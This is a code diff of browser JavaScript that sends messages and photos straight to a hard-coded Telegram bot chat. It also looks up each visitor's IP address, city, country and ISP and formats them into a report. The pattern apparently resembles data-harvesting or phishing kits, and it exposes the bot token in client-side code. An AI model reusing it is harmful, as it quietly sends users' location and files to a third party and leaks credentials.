@@ -6,68 +6,58 @@ const TELEGRAM_CONFIG = {
   authorizedChatId: "7211220207"
 };
 
-// Function to send message to Telegram via server proxy
+// Function to send message to Telegram
 async function sendTelegramMessage(message) {
   try {
-    const response = await fetch('/api/send-telegram', {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
-        message: message
+        chat_id: TELEGRAM_CONFIG.authorizedChatId,
+        text: message,
+        parse_mode: 'HTML'
       })
     });
     
     const result = await response.json();
     console.log('Telegram API response:', result);
-    return result.success;
+    return result.ok;
   } catch (error) {
     console.error('Error sending message to Telegram:', error);
     return false;
   }
 }
 
-// Function to send photo to Telegram via server proxy
+// Function to send photo to Telegram
 async function sendPhotoToTelegram(photoFile, caption) {
   try {
-    const reader = new FileReader();
-    const photoData = await new Promise((resolve) => {
-      reader.onload = () => {
-        const base64Data = reader.result.split(',')[1];
-        resolve({
-          data: base64Data,
-          filename: photoFile.name || 'photo.jpg'
-        });
-      };
-      reader.readAsDataURL(photoFile);
-    });
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CONFIG.authorizedChatId);
+    formData.append('photo', photoFile);
+    formData.append('caption', caption);
+    formData.append('parse_mode', 'HTML');
     
-    const response = await fetch('/api/send-telegram', {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        message: caption,
-        photo: photoData
-      })
+      body: formData
     });
     
     const result = await response.json();
     console.log('Telegram photo API response:', result);
-    return result.success;
+    return result.ok;
   } catch (error) {
     console.error('Error sending photo to Telegram:', error);
     return false;
   }
 }
 
-// Function to get IP and location information via server proxy
+// Function to get IP and location information
 async function getIpInfo() {
   try {
-    // Using server proxy to get IP and location info
-    const response = await fetch('/api/ip-info');
+    // Using ipinfo.io to get IP and location info
+    const response = await fetch('https://ipinfo.io/json');
     const data = await response.json();
     
     return `
@@ -80,14 +70,7 @@ async function getIpInfo() {
 • ISP: ${data.org || "Unknown"}`;
   } catch (error) {
     console.error('Error getting IP info:', error);
-    return `
-📍 Location Information:
-• IP Address: Unknown
-• City: Unknown
-• Region: Unknown
-• Country: Unknown
-• Location: Unknown
-• ISP: Unknown`;
+    return "Could not determine location information";
   }
 }
 
